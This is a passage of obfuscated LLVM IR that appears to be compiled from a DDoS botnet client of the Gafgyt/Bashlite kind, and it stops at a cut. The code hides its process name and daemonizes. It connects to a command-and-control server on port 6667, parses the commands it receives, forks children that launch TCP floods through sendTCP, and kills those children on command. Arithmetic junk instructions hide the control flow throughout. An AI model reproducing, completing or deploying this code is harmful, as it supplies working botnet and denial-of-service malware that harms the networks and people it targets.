  %460 = call i32 @listFork()
  %461 = icmp ne i32 %460, 0
  br i1 %461, label %462, label %463

; <label>:462:                                    ; preds = %459
  br label %533

; <label>:463:                                    ; preds = %459
  %464 = load i8*, i8** %22, align 8
  %465 = load i32, i32* %23, align 4
  %466 = load i32, i32* %24, align 4
  %467 = load i32, i32* %25, align 4
  %468 = load i8*, i8** %26, align 8
  %469 = load i32, i32* %28, align 4
  %470 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %464, i32 %465, i32 %466, i32 %467, i8* %468, i32 %469, i32 %470)
  call void @_exit(i32 0) #12
  unreachable

; <label>:471:                                    ; preds = %458
  br label %472

; <label>:472:                                    ; preds = %471, %345
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 0
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @strcmp(i8* %475, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %526, label %478

; <label>:478:                                    ; preds = %472
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  br label %479

; <label>:479:                                    ; preds = %509, %478
  %480 = load i64, i64* %31, align 8
  %481 = load i64, i64* @numpids, align 8
  %482 = icmp ult i64 %480, %481
  br i1 %482, label %483, label %515

; <label>:483:                                    ; preds = %479
  %484 = load i32*, i32** @pids, align 8
  %485 = load i64, i64* %31, align 8
  %486 = getelementptr inbounds i32, i32* %484, i64 %485
  %487 = load i32, i32* %486, align 4
  %488 = icmp ne i32 %487, 0
  br i1 %488, label %489, label %508

; <label>:489:                                    ; preds = %483
  %490 = load i32*, i32** @pids, align 8
  %491 = load i64, i64* %31, align 8
  %492 = getelementptr inbounds i32, i32* %490, i64 %491
  %493 = load i32, i32* %492, align 4
  %494 = call i32 @getpid() #2
  %495 = icmp ne i32 %493, %494
  br i1 %495, label %496, label %508

; <label>:496:                                    ; preds = %489
  %497 = load i32*, i32** @pids, align 8
  %498 = load i64, i64* %31, align 8
  %499 = getelementptr inbounds i32, i32* %497, i64 %498
  %500 = load i32, i32* %499, align 4
  %501 = call i32 @kill(i32 %500, i32 9) #2
  %502 = load i32, i32* %30, align 4
  %503 = sub i32 0, %502
  %504 = sub i32 0, 1
  %505 = add i32 %503, %504
  %506 = sub i32 0, %505
  %507 = add nsw i32 %502, 1
  store i32 %506, i32* %30, align 4
  br label %508

; <label>:508:                                    ; preds = %496, %489, %483
  br label %509

; <label>:509:                                    ; preds = %508
  %510 = load i64, i64* %31, align 8
  %511 = sub i64 %510, 8532909591863150866
  %512 = add i64 %511, 1
  %513 = add i64 %512, 8532909591863150866
  %514 = add i64 %510, 1
  store i64 %513, i64* %31, align 8
  br label %479

; <label>:515:                                    ; preds = %479
  %516 = load i32, i32* %30, align 4
  %517 = icmp sgt i32 %516, 0
  br i1 %517, label %518, label %522

; <label>:518:                                    ; preds = %515
  %519 = load i32, i32* @mainCommSock, align 4
  %520 = load i32, i32* %30, align 4
  %521 = call i32 (i32, i8*, ...) @sockprintf(i32 %519, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.58, i32 0, i32 0), i32 %520)
  br label %525

; <label>:522:                                    ; preds = %515
  %523 = load i32, i32* @mainCommSock, align 4
  %524 = call i32 (i32, i8*, ...) @sockprintf(i32 %523, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.59, i32 0, i32 0))
  br label %525

; <label>:525:                                    ; preds = %522, %518
  br label %526

; <label>:526:                                    ; preds = %525, %472
  %527 = load i8**, i8*** %4, align 8
  %528 = getelementptr inbounds i8*, i8** %527, i64 0
  %529 = load i8*, i8** %528, align 8
  %530 = call i32 @strcmp(i8* %529, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0)) #10
  %531 = icmp ne i32 %530, 0
  br i1 %531, label %533, label %532

; <label>:532:                                    ; preds = %526
  call void @exit(i32 0) #14
  unreachable

; <label>:533:                                    ; preds = %526, %462, %396, %336, %280, %220, %183, %156, %121, %96, %91, %85, %72, %60, %46, %37
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, 1
  %13 = sub i32 %11, %12
  %14 = add nsw i32 %11, 1
  %15 = sext i32 %13 to i64
  %16 = icmp eq i64 %15, 1
  br i1 %16, label %17, label %18

; <label>:17:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %24

; <label>:18:                                     ; preds = %10
  %19 = load i32, i32* @currentServer, align 4
  %20 = add i32 %19, 1544255881
  %21 = add i32 %20, 1
  %22 = sub i32 %21, 1544255881
  %23 = add nsw i32 %19, 1
  store i32 %22, i32* @currentServer, align 4
  br label %24

; <label>:24:                                     ; preds = %18, %17
  %25 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %26 = load i32, i32* @currentServer, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %27
  %29 = load i8*, i8** %28, align 8
  %30 = call i8* @strcpy(i8* %25, i8* %29) #2
  store i32 6667, i32* %3, align 4
  %31 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %32 = call i8* @strchr(i8* %31, i32 58) #10
  %33 = icmp ne i8* %32, null
  br i1 %33, label %34, label %41

; <label>:34:                                     ; preds = %24
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %36 = call i8* @strchr(i8* %35, i32 58) #10
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = call i32 @atoi(i8* %37) #10
  store i32 %38, i32* %3, align 4
  %39 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %40 = call i8* @strchr(i8* %39, i32 58) #10
  store i8 0, i8* %40, align 1
  br label %41

; <label>:41:                                     ; preds = %34, %24
  %42 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %42, i32* @mainCommSock, align 4
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %45 = load i32, i32* %3, align 4
  %46 = call i32 @connectTimeout(i32 %43, i8* %44, i32 %45, i32 30)
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %49, label %48

; <label>:48:                                     ; preds = %41
  store i32 1, i32* %1, align 4
  br label %50

; <label>:49:                                     ; preds = %41
  store i32 0, i32* %1, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %48
  %51 = load i32, i32* %1, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.62, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.63, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8** %6, align 8
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8** %26, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = ptrtoint i8* %27 to i64
  %29 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %28, i32 0, i32 0, i32 0)
  %30 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %31 = call i32 @getpid() #2
  %32 = xor i32 %30, -1
  %33 = and i32 %31, %32
  %34 = xor i32 %31, -1
  %35 = and i32 %30, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %30, %31
  call void @srand(i32 %36) #2
  %38 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %39 = call i32 @getpid() #2
  %40 = xor i32 %38, -1
  %41 = and i32 165895376, %40
  %42 = xor i32 165895376, -1
  %43 = and i32 %38, %42
  %44 = xor i32 %39, -1
  %45 = and i32 %44, 165895376
  %46 = and i32 %39, %42
  %47 = or i32 %41, %43
  %48 = or i32 %45, %46
  %49 = xor i32 %47, %48
  %50 = xor i32 %38, %39
  call void @init_rand(i32 %49)
  %51 = call i32 @getOurIP()
  %52 = call i32 @fork() #2
  store i32 %52, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %54, label %57

; <label>:54:                                     ; preds = %2
  %55 = load i32, i32* %7, align 4
  %56 = call i32 @waitpid(i32 %55, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:57:                                     ; preds = %2
  %58 = load i32, i32* %7, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %57
  %61 = call i32 @fork() #2
  store i32 %61, i32* %8, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %64

; <label>:63:                                     ; preds = %60
  call void @exit(i32 0) #14
  unreachable

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %8, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %68, label %67

; <label>:67:                                     ; preds = %64
  br label %70

; <label>:68:                                     ; preds = %64
  %69 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0))
  br label %70

; <label>:70:                                     ; preds = %68, %67
  br label %71

; <label>:71:                                     ; preds = %70
  br label %74

; <label>:72:                                     ; preds = %57
  %73 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0))
  br label %74

; <label>:74:                                     ; preds = %72, %71
  br label %75

; <label>:75:                                     ; preds = %74
  %76 = call i32 @setsid() #2
  %77 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.66, i32 0, i32 0)) #2
  %78 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %79

; <label>:79:                                     ; preds = %410, %82, %75
  %80 = call i32 @initConnection()
  %81 = icmp ne i32 %80, 0
  br i1 %81, label %82, label %85

; <label>:82:                                     ; preds = %79
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.67, i32 0, i32 0))
  %84 = call i32 @sleep(i32 5)
  br label %79

; <label>:85:                                     ; preds = %79
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %86

; <label>:86:                                     ; preds = %409, %319, %234, %196, %85
  %87 = load i32, i32* @mainCommSock, align 4
  %88 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %89 = call i32 @recvLine(i32 %87, i8* %88, i32 4096)
  store i32 %89, i32* %11, align 4
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %91, label %410

; <label>:91:                                     ; preds = %86
  store i32 0, i32* %12, align 4
  br label %92

; <label>:92:                                     ; preds = %181, %91
  %93 = load i32, i32* %12, align 4
  %94 = sext i32 %93 to i64
  %95 = load i64, i64* @numpids, align 8
  %96 = icmp ult i64 %94, %95
  br i1 %96, label %97, label %187

; <label>:97:                                     ; preds = %92
  %98 = load i32*, i32** @pids, align 8
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i32, i32* %98, i64 %100
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @waitpid(i32 %102, i32* null, i32 1)
  %104 = icmp sgt i32 %103, 0
  br i1 %104, label %105, label %180

; <label>:105:                                    ; preds = %97
  %106 = load i32, i32* %12, align 4
  %107 = sub i32 %106, -1423079168
  %108 = add i32 %107, 1
  %109 = add i32 %108, -1423079168
  %110 = add nsw i32 %106, 1
  store i32 %109, i32* %14, align 4
  br label %111

; <label>:111:                                    ; preds = %129, %105
  %112 = load i32, i32* %14, align 4
  %113 = zext i32 %112 to i64
  %114 = load i64, i64* @numpids, align 8
  %115 = icmp ult i64 %113, %114
  br i1 %115, label %116, label %135

; <label>:116:                                    ; preds = %111
  %117 = load i32*, i32** @pids, align 8
  %118 = load i32, i32* %14, align 4
  %119 = zext i32 %118 to i64
  %120 = getelementptr inbounds i32, i32* %117, i64 %119
  %121 = load i32, i32* %120, align 4
  %122 = load i32*, i32** @pids, align 8
  %123 = load i32, i32* %14, align 4
  %124 = sub i32 0, 1
  %125 = add i32 %123, %124
  %126 = sub i32 %123, 1
  %127 = zext i32 %125 to i64
  %128 = getelementptr inbounds i32, i32* %122, i64 %127
  store i32 %121, i32* %128, align 4
  br label %129

; <label>:129:                                    ; preds = %116
  %130 = load i32, i32* %14, align 4
  %131 = add i32 %130, -1555613674
  %132 = add i32 %131, 1
  %133 = sub i32 %132, -1555613674
  %134 = add i32 %130, 1
  store i32 %133, i32* %14, align 4
  br label %111

; <label>:135:                                    ; preds = %111
  %136 = load i32*, i32** @pids, align 8
  %137 = load i32, i32* %14, align 4
  %138 = sub i32 %137, -567235644
  %139 = sub i32 %138, 1
  %140 = add i32 %139, -567235644
  %141 = sub i32 %137, 1
  %142 = zext i32 %140 to i64
  %143 = getelementptr inbounds i32, i32* %136, i64 %142
  store i32 0, i32* %143, align 4
  %144 = load i64, i64* @numpids, align 8
  %145 = sub i64 0, -1
  %146 = sub i64 %144, %145
  %147 = add i64 %144, -1
  store i64 %146, i64* @numpids, align 8
  %148 = load i64, i64* @numpids, align 8
  %149 = sub i64 0, 1
  %150 = sub i64 %148, %149
  %151 = add i64 %148, 1
  %152 = mul i64 %150, 4
  %153 = call noalias i8* @malloc(i64 %152) #2
  %154 = bitcast i8* %153 to i32*
  store i32* %154, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %155

; <label>:155:                                    ; preds = %170, %135
  %156 = load i32, i32* %14, align 4
  %157 = zext i32 %156 to i64
  %158 = load i64, i64* @numpids, align 8
  %159 = icmp ult i64 %157, %158
  br i1 %159, label %160, label %176

; <label>:160:                                    ; preds = %155
  %161 = load i32*, i32** @pids, align 8
  %162 = load i32, i32* %14, align 4
  %163 = zext i32 %162 to i64
  %164 = getelementptr inbounds i32, i32* %161, i64 %163
  %165 = load i32, i32* %164, align 4
  %166 = load i32*, i32** %13, align 8
  %167 = load i32, i32* %14, align 4
  %168 = zext i32 %167 to i64
  %169 = getelementptr inbounds i32, i32* %166, i64 %168
  store i32 %165, i32* %169, align 4
  br label %170

; <label>:170:                                    ; preds = %160
  %171 = load i32, i32* %14, align 4
  %172 = sub i32 %171, 1398185305
  %173 = add i32 %172, 1
  %174 = add i32 %173, 1398185305
  %175 = add i32 %171, 1
  store i32 %174, i32* %14, align 4
  br label %155

; <label>:176:                                    ; preds = %155
  %177 = load i32*, i32** @pids, align 8
  %178 = bitcast i32* %177 to i8*
  call void @free(i8* %178) #2
  %179 = load i32*, i32** %13, align 8
  store i32* %179, i32** @pids, align 8
  br label %180

; <label>:180:                                    ; preds = %176, %97
  br label %181

; <label>:181:                                    ; preds = %180
  %182 = load i32, i32* %12, align 4
  %183 = sub i32 %182, 1066710874
  %184 = add i32 %183, 1
  %185 = add i32 %184, 1066710874
  %186 = add nsw i32 %182, 1
  store i32 %185, i32* %12, align 4
  br label %92

; <label>:187:                                    ; preds = %92
  %188 = load i32, i32* %11, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %189
  store i8 0, i8* %190, align 1
  %191 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %191)
  %192 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %193 = call i8* @strstr(i8* %192, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %194 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %195 = icmp eq i8* %193, %194
  br i1 %195, label %196, label %199

; <label>:196:                                    ; preds = %187
  %197 = load i32, i32* @mainCommSock, align 4
  %198 = call i32 (i32, i8*, ...) @sockprintf(i32 %197, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0))
  br label %86

; <label>:199:                                    ; preds = %187
  %200 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %201 = call i8* @strstr(i8* %200, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0)) #10
  %202 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %203 = icmp eq i8* %201, %202
  br i1 %203, label %204, label %205

; <label>:204:                                    ; preds = %199
  call void @exit(i32 0) #14
  unreachable

; <label>:205:                                    ; preds = %199
  %206 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %206, i8** %15, align 8
  %207 = load i8*, i8** %15, align 8
  %208 = load i8, i8* %207, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 33
  br i1 %210, label %211, label %409

; <label>:211:                                    ; preds = %205
  %212 = load i8*, i8** %15, align 8
  %213 = getelementptr inbounds i8, i8* %212, i64 1
  store i8* %213, i8** %16, align 8
  br label %214

; <label>:214:                                    ; preds = %226, %211
  %215 = load i8*, i8** %16, align 8
  %216 = load i8, i8* %215, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp ne i32 %217, 32
  br i1 %218, label %219, label %224

; <label>:219:                                    ; preds = %214
  %220 = load i8*, i8** %16, align 8
  %221 = load i8, i8* %220, align 1
  %222 = zext i8 %221 to i32
  %223 = icmp ne i32 %222, 0
  br label %224

; <label>:224:                                    ; preds = %219, %214
  %225 = phi i1 [ false, %214 ], [ %223, %219 ]
  br i1 %225, label %226, label %229

; <label>:226:                                    ; preds = %224
  %227 = load i8*, i8** %16, align 8
  %228 = getelementptr inbounds i8, i8* %227, i32 1
  store i8* %228, i8** %16, align 8
  br label %214

; <label>:229:                                    ; preds = %224
  %230 = load i8*, i8** %16, align 8
  %231 = load i8, i8* %230, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp eq i32 %232, 0
  br i1 %233, label %234, label %235

; <label>:234:                                    ; preds = %229
  br label %86

; <label>:235:                                    ; preds = %229
  %236 = load i8*, i8** %16, align 8
  store i8 0, i8* %236, align 1
  %237 = load i8*, i8** %15, align 8
  %238 = getelementptr inbounds i8, i8* %237, i64 1
  store i8* %238, i8** %16, align 8
  %239 = load i8*, i8** %15, align 8
  %240 = load i8*, i8** %16, align 8
  %241 = call i64 @strlen(i8* %240) #10
  %242 = getelementptr inbounds i8, i8* %239, i64 %241
  %243 = getelementptr inbounds i8, i8* %242, i64 2
  store i8* %243, i8** %15, align 8
  br label %244

; <label>:244:                                    ; preds = %269, %235
  %245 = load i8*, i8** %15, align 8
  %246 = load i8*, i8** %15, align 8
  %247 = call i64 @strlen(i8* %246) #10
  %248 = sub i64 %247, -1359784312334319640
  %249 = sub i64 %248, 1
  %250 = add i64 %249, -1359784312334319640
  %251 = sub i64 %247, 1
  %252 = getelementptr inbounds i8, i8* %245, i64 %250
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 10
  br i1 %255, label %267, label %256

; <label>:256:                                    ; preds = %244
  %257 = load i8*, i8** %15, align 8
  %258 = load i8*, i8** %15, align 8
  %259 = call i64 @strlen(i8* %258) #10
  %260 = sub i64 0, 1
  %261 = add i64 %259, %260
  %262 = sub i64 %259, 1
  %263 = getelementptr inbounds i8, i8* %257, i64 %261
  %264 = load i8, i8* %263, align 1
  %265 = zext i8 %264 to i32
  %266 = icmp eq i32 %265, 13
  br label %267

; <label>:267:                                    ; preds = %256, %244
  %268 = phi i1 [ true, %244 ], [ %266, %256 ]
  br i1 %268, label %269, label %277

; <label>:269:                                    ; preds = %267
  %270 = load i8*, i8** %15, align 8
  %271 = load i8*, i8** %15, align 8
  %272 = call i64 @strlen(i8* %271) #10
  %273 = sub i64 0, 1
  %274 = add i64 %272, %273
  %275 = sub i64 %272, 1
  %276 = getelementptr inbounds i8, i8* %270, i64 %274
  store i8 0, i8* %276, align 1
  br label %244

; <label>:277:                                    ; preds = %267
  %278 = load i8*, i8** %15, align 8
  store i8* %278, i8** %17, align 8
  br label %279

; <label>:279:                                    ; preds = %291, %277
  %280 = load i8*, i8** %15, align 8
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp ne i32 %282, 32
  br i1 %283, label %284, label %289

; <label>:284:                                    ; preds = %279
  %285 = load i8*, i8** %15, align 8
  %286 = load i8, i8* %285, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp ne i32 %287, 0
  br label %289

; <label>:289:                                    ; preds = %284, %279
  %290 = phi i1 [ false, %279 ], [ %288, %284 ]
  br i1 %290, label %291, label %294

; <label>:291:                                    ; preds = %289
  %292 = load i8*, i8** %15, align 8
  %293 = getelementptr inbounds i8, i8* %292, i32 1
  store i8* %293, i8** %15, align 8
  br label %279

